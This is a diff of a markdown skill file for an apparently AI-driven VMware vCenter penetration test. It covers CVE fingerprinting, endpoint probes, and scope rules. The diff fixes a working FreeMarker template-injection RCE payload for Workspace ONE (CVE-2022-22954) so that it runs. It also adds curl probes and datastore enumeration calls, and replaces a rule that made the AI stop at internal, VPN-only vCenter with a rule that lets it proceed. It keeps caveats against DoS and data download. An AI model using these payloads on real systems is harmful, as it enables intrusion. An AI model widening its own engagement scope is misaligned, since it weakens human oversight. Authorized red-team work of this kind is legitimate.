@@ -1,6 +1,6 @@
 ---
 name: vmware-vcenter-attack
-description: VMware vSphere / vCenter Server external attack matrix — version fingerprinting, the high-impact CVE chain (CVE-2021-21972 vRealize unauth file upload, CVE-2021-21985 vSAN plugin RCE, CVE-2022-22954 Workspace ONE SSTI, CVE-2023-20887 Aria RCE, CVE-2024-37085 ESXi AD bypass, CVE-2023-34048 vCenter DCERPC OOB write APT-exploited), default credentials, SSO configuration disclosure, vmdir LDAP enumeration, ESXi Open SLP RCE history. ONLY for vCenter / Workspace ONE / Aria instances exposed to the internet — internal-network vCenter is out of scope per the external-only boundary. Use when recon shows port 443 with vCenter banner, `/ui` redirect, `/websso/SAML2/Metadata`, or VMware product fingerprints.
+description: VMware vSphere / vCenter Server attack matrix — version fingerprinting, the high-impact CVE chain (CVE-2021-21972 vCenter vROps plugin unauth file upload, CVE-2021-21985 vSAN plugin RCE, CVE-2022-22954 Workspace ONE SSTI, CVE-2023-20887 Aria RCE, CVE-2024-37085 ESXi AD bypass, CVE-2023-34048 vCenter DCERPC OOB write APT-exploited, CVE-2024-38812 DCERPC heap overflow, CVE-2025-41225 authenticated command execution), default credentials, SSO configuration disclosure, vmdir LDAP enumeration, ESXi Open SLP RCE history. Use when an in-scope host shows port 443 with vCenter banner, `/ui` redirect, `/websso/SAML2/Metadata`, or VMware product fingerprints (internet-exposed or authorized VPN/assume-breach).
 sources: vmware-security-advisories, public-cve-databases, redteam-knowledge, disclosed-cves, cisa-kev, mandiant-zdi-writeups
 report_count: 10
 ---
@@ -16,8 +16,8 @@ Trigger when external recon shows ANY of:
 - Horizon View: `/portal`, `/admin`
 
 Do NOT use for:
-- Internal-network vCenter (out of scope — external boundary discipline)
-- Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)
+- Hosts that are **out of scope**. Internal vCenter reached only via an unauthorized pivot stays out. If the engagement lists the host — including via authorized VPN / assume-breach — this skill applies.
+- Pure ESXi with no management plane: still fingerprint OpenSLP `:427` if that host is in scope; otherwise note it and move on. Do not run crash/DoS PoCs (OpenSLP heap overflow, guest-OS customization DoS).
 
 ---
 
@@ -52,7 +52,10 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 
 | CVE | Affected | Vector | Status |
 |---|---|---|---|
-| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
+| **CVE-2024-38812** | vCenter 7.0 before 7.0 U3t; 8.0 before 8.0 U3d or 8.0 U2e | DCERPC heap overflow, pre-auth network (CVSS 9.8). The 2024-09-17 patch was incomplete; 2024-10-21 builds are the fix. CVE-2024-38813 (CVSS 7.5) is the bundled privilege escalation. 6.5/6.7 are not affected | Critical **candidate** from the build number. Do not send crash packets |
+| **CVE-2025-41225** | vCenter 7.0 before U3v; 8.0 before U3e (VMSA-2025-0010) | Authenticated command execution via alarm / script-action privileges (CVSS 8.8). Not pre-auth | High **candidate** after you already have a session. Prove via build number. Do not run script actions against production VMs |
+| **CVE-2025-22224 / 22225 / 22226** | ESXi before VMSA-2025-0004 (7.0 U3s `24585291`, 8.0 U3d `24585383`, 8.0 U2d `24585300`) | Guest-local admin to VMX escape (TOCTOU / arbitrary write / HGFS read). Not an internet pre-auth bug | Not an external first test |
+| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — needs AD rights to create the group, then ESXi admin. Not an external pre-auth scan |
 | **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
 | **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
 | **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
@@ -74,9 +77,9 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 # Detection only — DO NOT execute the file upload without explicit scope OK
 curl -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
-# 405 → endpoint exists, version vulnerable
-# 404 → patched (endpoint removed)
-# 401 → patched (auth required)
+# 405 on GET → route still mounted (candidate). Compare the build from Step 1.
+# 404 → route gone. 401 → auth required.
+# Do not POST an OVA. A webshell or authorized_keys write needs an explicit RCE proof in the rules of engagement, then one shot and cleanup.
 
 curl -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
@@ -98,12 +101,15 @@ curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
 # Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
 # so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
 CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
-curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
-# Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output
-# that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
+# Class is Execute, not Execution. URL-encode the whole ${...} value.
+PAYLOAD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" \
+  "\${\"freemarker.template.utility.Execute\"?new()(\"echo ${CANARY}; id\")}")
+curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=${PAYLOAD}"
+# Confirmed RCE ONLY if the exact $CANARY comes back in the device-id error text AND "uid="
+# is absent from /tmp/wone_baseline.txt. Output often sits between "workspace, device id:" and ", device type:".
 ```
 
-Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation.
+Confirmed RCE requires the unique `$CANARY` in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation. A FreeMarker exception that names `Execution` means the payload class was wrong, not that the host is patched.
 
 ---
 
@@ -167,8 +173,8 @@ curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"
 # List datastores
 curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"
 
-# Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)
-# /folder/<path>?dsName=<ds>&dcPath=<dc>
+# List datastore names only. One name listing proves access.
+# Do not download VMDKs, snapshots, or cloud-init files.
 curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
 ```
 
@@ -228,11 +234,11 @@ Pair with `mid-engagement-ir-detection` skill — vCenter is monitored heavily i
 
 ---
 
-## External-only boundary check
+## Scope boundary
 
-If recon reveals vCenter only via VPN (not direct internet) → STOP. That is internal infrastructure and outside the external-only AI scope per `feedback_skill_boundaries`. The user handles internal vCenter work directly.
+Internet-exposed vCenter is still common and frequently years behind on patches. The 2021-21972 / 21985 / 22954 trifecta still shows up in 2026 because hypervisor-management patch cycles are slow.
 
-Internet-exposed vCenter is unfortunately common on the perimeter — and frequently outdated by years. The 2021-21972 / 21985 / 22954 trifecta still pays in 2026 because patching cycles for hypervisor management are slow and vendor-managed.
+If the host is reached only through a path that is **not in the scope list** (typical: a VPN the engagement did not authorize) → stop. If assume-breach / VPN *is* in scope and the host is listed, continue this matrix. Do not treat "internal" as a hard skip when the RoE already put you there.
 
 ---
 
@@ -353,6 +359,27 @@ These are the load-bearing public references for every CVE called out in the mat
 - **Disclosure:** CVE-2020-3992 reported by Lucas Leong of Trend Micro ZDI (ZDI-20-1376, paid ZDI submission). CVE-2021-21974 reported by Lucas Leong of Trend Micro ZDI as well. **CISA KEV:** CVE-2020-3992 added 2021-11-03; CVE-2021-21974 added 2023-02-08. **ESXiArgs ransomware campaign** (Feb 2023) hit ~3,800 internet-exposed hosts via CVE-2021-21974 — two years after patch was available. VMware disabled SLP by default in subsequent releases. Year discovered 2020/2021, patched 2020/2021, mass-exploited 2023.
 - **References:** https://www.vmware.com/security/advisories/VMSA-2020-0023.html ; https://www.vmware.com/security/advisories/VMSA-2021-0002.html ; https://www.zerodayinitiative.com/advisories/ZDI-20-1376/ ; https://www.cisa.gov/known-exploited-vulnerabilities-catalog ; https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/ ; https://www.recordedfuture.com/blog/esxiargs-ransomware-targets-vmware-esxi-openslp-servers
 
+### 11. CVE-2024-38812 / CVE-2024-38813 — vCenter DCERPC heap overflow (VMSA-2024-0019)
+
+- Pre-auth network heap overflow in vCenter 7.0 and 8.0 (CVSS 9.8), plus privilege escalation CVE-2024-38813 (CVSS 7.5). vCenter 6.5 and 6.7 are not affected. CISA KEV: 2024-11-20.
+- Patches published 2024-09-17 did not fully fix CVE-2024-38812. The advisory update on 2024-10-21 lists the real fixed builds: 8.0 U3d, 8.0 U2e, and 7.0 U3t.
+- Allowed proof: the build from `/sdk/vimServiceVersions.xml` is below that fixed build. That is a candidate, not confirmed RCE. Do not send crafted DCERPC packets.
+- References: https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24968 ; https://nvd.nist.gov/vuln/detail/CVE-2024-38812
+
+### 12. CVE-2025-22224 / CVE-2025-22225 / CVE-2025-22226 — ESXi guest-to-host (VMSA-2025-0004)
+
+- Exploited zero-days, patched 2025-03-04. CVE-2025-22224 (CVSS 9.3) is a VMCI TOCTOU that needs a local administrator inside a guest VM. CVE-2025-22225 (CVSS 8.2) is an arbitrary write from the VMX process. CVE-2025-22226 (CVSS 7.1) is an HGFS out-of-bounds read. None of them is an unauthenticated request to port 443.
+- Fixed ESXi builds include ESXi70U3s-24585291, ESXi80U3d-24585383, and ESXi80U2d-24585300.
+- References: https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/VMSA-2025-0004--VMware-ESXi--Workstation--and-Fusion-updates-address-multiple-vulnerabilities--CVE-2025-22224--CVE-2025-22225--CVE-2025-22226-/25390
+
+### 13. CVE-2025-41225 — vCenter authenticated command execution (VMSA-2025-0010)
+
+- vCenter 7.0 before 7.0 U3v, 8.0 before 8.0 U3e. Requires a session that can create/modify alarms and run script actions (CVSS 8.8). Not a pre-auth internet bug.
+- Allowed proof: build from `/sdk/vimServiceVersions.xml` or `/api/appliance/system/version` is below the fixed build. That is a **candidate**. Do not fire a script action at a production VM.
+- Chain: default/leaked SSO admin (Step 5) or federated Entra ATO (`m365-entra-attack`) → this becomes the post-auth RCE hop. Stop at the version proof unless RoE allows one non-destructive check.
+- Skip **CVE-2025-41241** (VMSA-2025-0014, guest-OS customization DoS). DoS is out of scope.
+- References: https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/securityAdvisories/0/25717 ; https://nvd.nist.gov/vuln/detail/CVE-2025-41225
+
 ### Bonus: CVE-2022-31656 — Workspace ONE Access / Identity Manager / vRealize Automation auth bypass (post-22972 follow-up)
 - **Affected:** Same product matrix as 22954/22972. Workspace ONE Access 21.08.x; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6.
 - **Attack flow:** Network-only actor obtains admin without authenticating; chained with CVE-2022-31659 (auth'd RCE) the pair yields pre-auth admin RCE — the spiritual successor to the 22954+22972 pair.
@@ -369,4 +396,4 @@ These are the load-bearing public references for every CVE called out in the mat
 - **ZDI published advisories:** https://www.zerodayinitiative.com/advisories/published/ — filter "VMware" for the canonical paid-bounty disclosures (CVE-2020-3992, CVE-2023-34048, multiple Aria Operations and vRNI).
 - **Mandiant UNC3886 reporting:** Google Cloud Threat Intelligence has the deepest published forensic trail on long-tail vCenter zero-day exploitation. Pair with the `mid-engagement-ir-detection` skill when working a target where vCenter is reachable.
 
-The pattern across every entry above: **VMware management-plane CVEs are pre-auth, network-reachable, and mass-exploited within days of patch.** When external recon surfaces any of these products at a current-minus-one patch level, that is a Critical finding worth a same-day callout in the deliverable — not a Medium info-disclosure.
+The pattern across the pre-auth entries: **management-plane CVEs are network-reachable and mass-exploited within days of patch.** A build number below the fixed release is a **Critical candidate** (same-day callout in the draft) — confirmed RCE only after the safe proof for that CVE (unique canary or body-diff). Do not send crash packets. Post-auth rows (CVE-2025-41225, CVE-2024-37085) stay High candidates until you actually hold a session.
